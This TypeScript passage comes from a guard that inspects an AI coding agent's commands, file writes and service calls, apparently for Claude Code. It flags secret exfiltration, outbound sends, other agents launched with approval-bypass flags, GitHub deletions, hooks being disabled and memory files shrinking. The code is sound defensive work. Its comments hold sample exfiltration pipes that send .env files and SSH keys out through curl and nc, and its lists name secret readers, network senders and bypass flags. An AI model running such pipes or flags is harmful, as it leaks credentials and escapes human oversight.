const SECRET_READERS = new Set([
  'cat',
  'tac',
  'type',
  'get-content',
  'head',
  'tail',
  'more',
  'less',
  'base64',
  'xxd',
  'od',
  'hexdump',
  'strings',
  'gzip',
  'bzip2',
  'xz',
  'zip',
  'tar',
  '7z',
  'openssl',
  'gpg',
  'jq',
  'yq',
  'sed',
  'awk',
  'gawk',
  'cut',
  'sort',
  'grep',
  'rg',
  'findstr',
  'select-string',
  'certutil',
]);

/**
 * A secret read by one program and sent by the next through a pipe: `cat .env | curl --data-binary @- …`,
 * `type id_rsa | nc host 9000`. The belt reads one call at a time, so the pair is judged on the whole command.
 */
function checkPipedSecret(invs: readonly Invocation[], s: Scope): void {
  const stdinSender = (inv: Invocation): boolean => {
    const a = inv.args;
    if (/^(?:nc|ncat|netcat|socat|telnet)$/.test(inv.program)) return !a.some((x) => /^-[a-z]*z/.test(x)); // -z only probes a port
    if (inv.program === 'curl')
      return optionValues(a, ['-d', '-T', '-F'], ['--data', '--data-binary', '--data-urlencode', '--data-raw', '--json', '--upload-file', '--form']).some(
        (v) => v === '@-' || v === '-' || v === '.' || /=[@<]-$/.test(v),
      );
    if (inv.program === 'wget') return optionValues(a, [], ['--post-file', '--body-file']).some((v) => v === '-' || v === '/dev/stdin');
    return false;
  };
  const senders = invs.filter(stdinSender);
  if (!senders.length) return;
  for (const inv of invs) {
    if (senders.includes(inv) || !SECRET_READERS.has(inv.program)) continue;
    const f = inv.args.find((x) => !x.startsWith('-') && secretFile(x));
    if (f) return add(s, 'secrets.exfil', 'belt.reason.exfil', { what: show(f) });
  }
  for (const inv of senders) {
    const m = /<\s*("[^"]+"|'[^']+'|\S+)/.exec(inv.raw);
    if (m && secretFile(m[1]!.replace(/^["']|["']$/g, ''))) return add(s, 'secrets.exfil', 'belt.reason.exfil', { what: show(m[1]!) });
  }
}

/**
 * Data sent off the computer by a command: where it goes is the target, the person's own or not (src/core/provenance.ts).
 * To this computer it does not leave; a host only known when it runs is asked as unknown.
 */
function checkNetwork(inv: Invocation, s: Scope): void {
  if (!sends(inv.program, inv.args)) return;
  // Deleting on GitHub through its API is its own rule (github.delete), not data sent.
  if (inv.program === 'gh' && optionValues(inv.args, ['-X'], ['--method']).some((m) => m.toUpperCase() === 'DELETE')) return;
  const all = sendHosts(inv.program, inv.args, inv.dynamic);
  const hosts = all.filter((h) => !isLocalHost(h));
  if (all.length && !hosts.length) return;
  add(s, 'outbound.network', 'belt.reason.network', { command: show(inv.raw) });
  // gh's host is GitHub whatever the call says: it is taken from nothing the session read.
  actsOn(s, hosts.length ? { kind: 'host', values: hosts, ...(inv.program === 'gh' ? { implicit: true as const } : {}) } : undefined);
}

/** Other agent programs started without their own approvals: a session the belt does not watch. */
const AGENT_BYPASS: Readonly<Record<string, RegExp>> = {
  codex: /^--(?:dangerously-bypass-approvals-and-sandbox|yolo)$/,
  gemini: /^(?:--yolo|-y|--approval-mode=yolo)$/,
  aider: /^--yes-always$/,
  amp: /^--dangerously-allow-all$/,
};

function checkAgents(inv: Invocation, s: Scope): void {
  const flag = Object.hasOwn(AGENT_BYPASS, inv.program) ? AGENT_BYPASS[inv.program] : undefined;
  if (flag && inv.args.some((a) => flag.test(a))) add(s, 'self.nested-session', 'belt.reason.nestedAgent', { program: inv.program, command: show(inv.raw) });
}

/** GitHub through its command line: merging past the required checks, deleting what lives there. */
function checkGitHub(inv: Invocation, s: Scope): void {
  const w = plainWords(inv);
  const a = inv.args.map((x) => x.toLowerCase());
  const raw = show(inv.raw);
  if (w[0] === 'pr' && w[1] === 'merge' && a.includes('--admin')) add(s, 'github.admin-merge', 'belt.reason.adminMerge', { command: raw });
  if (w[0] === 'repo' && w[1] === 'delete') return add(s, 'data.delete-cloud', 'belt.reason.deleteCloud', { command: raw });
  const deletes =
    (w[0] === 'repo' && w[1] === 'archive') ||
    (['release', 'secret', 'variable', 'label', 'gist'].includes(w[0] ?? '') && /^(?:delete|delete-asset|remove)$/.test(w[1] ?? '')) ||
    (w[0] === 'api' && optionValues(inv.args, ['-X'], ['--method']).some((m) => m.toUpperCase() === 'DELETE'));
  if (deletes) {
    add(s, 'github.delete', 'belt.reason.githubDelete', { command: raw });
    // The thing deleted, as named in the call: a release's tag, a secret's name, a repository, an API path.
    const named = w[0] === 'api' ? inv.args.slice(1).find((x) => !x.startsWith('-') && x.includes('/')) : inv.args.filter((x) => !x.startsWith('-'))[2];
    actsOn(s, named ? { kind: w[0] === 'repo' ? 'repo' : 'object', values: [named] } : undefined);
  }
}

/** What a payment is made of, in the Stripe command line's words (its resources). */
const PAY_RESOURCE = /^(?:charges?|payment_intents?|refunds?|payouts?|transfers?|invoices?|subscriptions?|checkout|payment_links?)$/;

/** A connected service's fields that name who receives: addresses, channels, people. */
const RECIPIENT = /^(?:to|cc|bcc|recipients?|emails?|attendees|invitees|users?|channels?|channel_(?:id|name)|chat_id|phone(?:_number)?|address(?:es)?)$/i;
/** Fields that name the thing a call acts on, readably; failing those, by its id. */
const NAMED = /^(?:name|title|subject|path|file(?:name)?|summary)$/i;
const IDENTIFIED = /^(?:id|\w+_id|\w+Id)$/;

/** The string values of a call's fields whose key matches (and not `except`), nested ones and lists too. */
function fieldValues(input: unknown, key: RegExp, except?: RegExp, depth = 0): string[] {
  if (depth > 4 || !input || typeof input !== 'object') return [];
  const out: string[] = [];
  for (const [k, v] of Object.entries(input as Record<string, unknown>)) {
    if (except?.test(k)) continue;
    const vals = Array.isArray(v) ? v : [v];
    for (const x of vals) {
      if (typeof x === 'string' && key.test(k)) out.push(x);
      else if (x && typeof x === 'object') out.push(...fieldValues(x, key.test(k) ? /^(?:email|address|id|name|value)$/i : key, except, depth + 1));
    }
  }
  return out;
}

/**
 * A connected service's tool (MCP: mail, calendars, drives …), known by the words in its name, whatever the style it is
 * written in (`send_email`, `sendEmail`: src/core/belt/tool-words.ts). Sending, sharing, adding a person and calendar
 * events reach other people and cannot be taken back: asked. Deleting there is asked too, and so is a payment, always.
 * A secret in what such a tool carries leaves the machine: blocked. A name that holds none of these words is not
 * judged: no vocabulary is complete.
 */
export function checkOutward(tool: string, input: Readonly<Record<string, unknown>>, ctx: BeltContext): Finding[] {
  const s: Scope = { ctx, paths: protectedPaths(ctx), findings: [], inline: false };
  const kinds = outwardKinds(toolWords(tool));
  // A payment through a connected service (a charge, a refund, a subscription, money sent): always the person's.
  if (kinds.pays) add(s, 'outbound.payment', 'belt.reason.payment', { what: tool });
  if (kinds.sends) {
    add(s, 'outbound.send', 'belt.reason.outboundSend', { tool });
    const to = fieldValues(input, RECIPIENT);
    actsOn(s, to.length ? { kind: 'recipient', values: to } : undefined);
    // What it carries: read from outside, it is not the person's message, whoever receives it.
    const f = s.findings.at(-1);
    if (f) f.carries = fieldValues(input, /./, RECIPIENT).join('\n');
  } else if (kinds.deletes) {
    add(s, 'outbound.delete', 'belt.reason.outboundDelete', { tool });
    const named = fieldValues(input, NAMED);
    const what = named.length ? named : fieldValues(input, IDENTIFIED);
    actsOn(s, what.length ? { kind: 'object', values: what } : undefined);
  }
  if (kinds.writes) {
    let text = '';
    try {
      text = JSON.stringify(input);
    } catch {
      text = '';
    }
    const found = secretKinds(text);
    if (found.length) add(s, 'secrets.exfil', 'belt.reason.exfil', { what: found.join(', ') });
  }
  return s.findings;
}

/** Best effort for code passed to interpreters (node -e, python -c): string literals that are commands or protected paths. */
async function checkInlineCode(inv: Invocation, cwd: string | null, s: Scope): Promise<void> {
  const code = inv.inlineCode ?? '';
  const literals = codeLiterals(code);
  const inner: Scope = { ...s, inline: true };
  for (const lit of literals) {
    if (/^\s*(?:git|rm|del|rd|rmdir|remove-item|docker|claude|schtasks|crontab|sudo|bash|sh|pwsh|powershell|cmd|npm|gh)\s/i.test(lit))
      await evaluateScript(lit, 'bash', inner, cwd);
  }
  // What a delete call is given (src/core/belt/inline.ts), not every path the code names.
  const deleted = new Set(deletedLiterals(code, inv.program));
  const writes =
    /\b(?:writeFileSync|appendFileSync|writeFile|appendFile|write_text|write_bytes|copyFileSync|copyFile|renameSync|rename|move|copy|copyfile|copy2|copytree|open)\s*\(/.test(
      code,
    );
  if (!deleted.size && !writes) return;
  for (const lit of literals) {
    if (!/^(?:[A-Za-z]:[\\/]|[\\/]|~|\.{1,2}[\\/])/.test(lit) || lit.length < 2) continue;
    const t = target({ text: lit, dynamic: false, glob: /[*?]/.test(lit) }, cwd, inner);
    if (deleted.has(lit)) checkDelete(t, true, inner);
    if (writes) checkWrite(t, 'replace', inner);
  }
}

/**
 * The setting given a value that turns hooks off: `"disableAllHooks": true`, `.disableAllHooks = true`, `= $true`,
 * or a value only known when it runs (`= $v`). A read (`jq '.disableAllHooks'`, `grep`) gives it none.
 */
const SETS_HOOKS_OFF = /(?:disableAllHooks|allowManagedHooksOnly)['"\]]*\s*[:=]\s*(?:true\b|1\b|\$\w)/i;

/** disableAllHooks set by a command that changes something; a command that only reads it is left alone. */
function checkDisableHooks(raw: string, invs: readonly Invocation[], s: Scope): void {
  if (!/disableAllHooks|allowManagedHooksOnly/i.test(raw)) return;
  // `claude config set disableAllHooks true` and the like: Claude Code's own command sets it.
  const byClaude = invs.some((i) => i.program === 'claude' && i.args.some((a) => /disableAllHooks|allowManagedHooksOnly/i.test(a)));
  if (!byClaude && !SETS_HOOKS_OFF.test(raw)) return;
  const changes = invs.some(
    (i) =>
      i.writes.length > 0 ||
      i.inlineCode !== undefined ||
      [
        'sed',
        'perl',
        'jq',
        'tee',
        'tee-object',
        'set-content',
        'add-content',
        'out-file',
        'cp',
        'copy-item',
        'mv',
        'move-item',
        'python',
        'python3',
        'py',
        'node',
        'bun',
        'deno',
        'ruby',
        'claude',
        'set-itemproperty',
        'new-item',
      ].includes(i.program),
  );
  if (changes) add(s, 'self.disable-hooks', 'belt.reason.disableHooks', { command: show(raw) });
}

const CD = new Set(['cd', 'pushd', 'set-location', 'chdir', 'sl', 'push-location']);

async function evaluateScript(command: string, dialect: Dialect, s: Scope, startCwd: string | null): Promise<void> {
  const analysis = analyzeCommand(command, dialect);
  let cwd = startCwd;
  for (const inv of analysis.invocations) {
    if (CD.has(inv.program)) {
      const arg = inv.args.find((x) => !x.startsWith('-'));
      if (arg === undefined) cwd = s.ctx.home;
      else if (arg === '-' || inv.dynamic[inv.args.indexOf(arg)]) {
        const e = expandVars(arg, s.ctx);
        cwd = e === null || arg === '-' ? null : s.paths.canonical(resolvePath(e, { platform: s.ctx.platform, home: s.ctx.home, cwd: cwd ?? s.ctx.cwd }));
      } else
        cwd =
          cwd === null && !/^(?:[A-Za-z]:|[\\/]|~)/.test(arg)
            ? null
            : s.paths.canonical(resolvePath(arg, { platform: s.ctx.platform, home: s.ctx.home, cwd: cwd ?? s.ctx.cwd }));
      continue;
    }
    if (inv.program === 'popd' || inv.program === 'pop-location') {
      cwd = null;
      continue;
    }
    await checkInvocation(inv, cwd, s, inv.dialect);
  }
  checkDisableHooks(command, analysis.invocations, s);
  checkPipedSecret(analysis.invocations, s);
  const strong = analysis.issues.filter((i) => STRONG_UNCERTAIN.has(i));
  // Whether it looks risky is read from the whole text, comments too: a text that did not parse cleanly may hold
  // its commands where the parser saw a comment.
  const weak = RISKY_SIGNAL.test(command) ? analysis.issues.filter((i) => WEAK_UNCERTAIN.has(i)) : [];
  const dynamic = analysis.invocations.some((inv) => inv.programDynamic && DYNAMIC_PROGRAM_RISK.test(inv.args.join(' '))) ? ['dynamic-program'] : [];
  const uncertain = [...strong, ...dynamic, ...weak];
  if (uncertain.length && !s.findings.some((f) => f.rule === 'meta.unverifiable')) {
    add(s, 'meta.unverifiable', 'belt.reason.unverifiable', { issues: uncertain.join(', ') });
  }
}

/** Checks a shell command (Bash or PowerShell tool). */
export async function checkCommand(command: string, dialect: Dialect, ctx: BeltContext): Promise<{ findings: Finding[]; issues: string[] }> {
  const s: Scope = { ctx, paths: protectedPaths(ctx), findings: [], inline: false };
  await evaluateScript(command, dialect, s, ctx.cwd);
  // What starts by itself is decided by the command that sets it up, word for word the person's or not.
  for (const f of s.findings)
    if (!f.unit && (f.rule === 'persist.scheduled-task' || f.rule === 'persist.startup' || f.rule === 'persist.shell-profile' || f.rule === 'persist.autorun'))
      f.unit = { kind: 'text', values: [command.trim()] };
  return { findings: s.findings, issues: analyzeCommand(command, dialect).issues };
}

/** Checks a file tool call (Write, Edit, MultiEdit, NotebookEdit). `content` is the new text when known. */
export interface FileToolInput {
  /** Full new content (Write). */
  content?: string | null;
  /** Replaced and replacing text (Edit; MultiEdit passes each pair). */
  edits?: { oldText: string; newText: string }[];
}

/**
 * Checks a file tool call (Write, Edit, MultiEdit, NotebookEdit). Memory files are written by Claude Code's
 * own memory feature all the time, so only a measured shrink is asked about: a Write that leaves less than
 * half of a file of at least 1 KB, or edits that remove at least 1 KB and leave less than half of it.
 */
export async function checkFileTool(tool: string, filePath: string, input: FileToolInput, ctx: BeltContext): Promise<Finding[]> {
  const s: Scope = { ctx, paths: protectedPaths(ctx), findings: [], inline: false };
  const t = target({ text: filePath, dynamic: false, glob: false }, ctx.cwd, s);
  checkWrite(t, tool === 'Write' ? 'tool-write' : 'edit', s);
  const texts = [input.content ?? '', ...(input.edits ?? []).map((e) => e.newText)].join('\n');
  if (/"?(?:disableAllHooks|allowManagedHooksOnly)"?\s*:\s*true/i.test(texts))
    add(s, 'self.disable-hooks', 'belt.reason.disableHooks', { command: show(filePath) });
  // A secret belongs in a secret store (.env, a key file), not in source, notes or memory. A test's own data is made up
  // (a token shaped like one, to test the code that reads it): no note there; staging it is still checked.
  if (t.path && !SECRET_FILE.test(t.path.split('/').pop() ?? '') && !TEST_DATA.test(t.path)) {
    const kinds = [
      ...new Set(
        scanSecrets(texts)
          .filter((m) => m.confidence === 'high')
          .map((m) => m.kind),
      ),
    ];
    if (kinds.length) add(s, 'secrets.write', 'belt.reason.secretInFile', { target: show(t.path), kinds: kinds.join(', ') });
  }
  if (t.path && under(t.path, s.paths.memoryDirs, ctx.platform)) {
    const bytes = (x: string) => new TextEncoder().encode(x).length;
    if (tool === 'Write' && typeof input.content === 'string' && ctx.fileSize) {
      const before = await ctx.fileSize(t.path);
      const after = bytes(input.content);
      if (before !== null && before >= 1024 && after < before * 0.5)
        add(s, 'self.memory-shrink', 'belt.reason.memoryShrink', { target: show(t.path), before, after });
    } else if (input.edits?.length) {
      const removed = input.edits.reduce((n, e) => n + bytes(e.oldText), 0);
      const added = input.edits.reduce((n, e) => n + bytes(e.newText), 0);
      if (removed >= 1024 && added < removed * 0.5)
        add(s, 'self.memory-shrink', 'belt.reason.memoryShrink', { target: show(t.path), before: removed, after: added });
    }
  }
  // A package.json given a script that runs on install.
  if (t.path && /(?:^|\/)package\.json$/i.test(t.path) && INSTALL_SCRIPT.test(texts))
    add(s, 'persist.autorun', 'belt.reason.autorun', { target: show(t.path) });
  for (const f of s.findings) {
    if ((f.rule === 'persist.startup' || f.rule === 'persist.shell-profile' || f.rule === 'persist.autorun') && texts.trim())
      f.unit = { kind: 'text', values: [texts.trim()] };
    if (f.rule === 'self.memory-shrink' && t.path) {
      f.unit = { kind: 'object', values: [t.path.split('/').pop() ?? ''] };
      f.net = { kind: 'paths', paths: [t.path], copy: true };
    }
  }
  return s.findings;
}
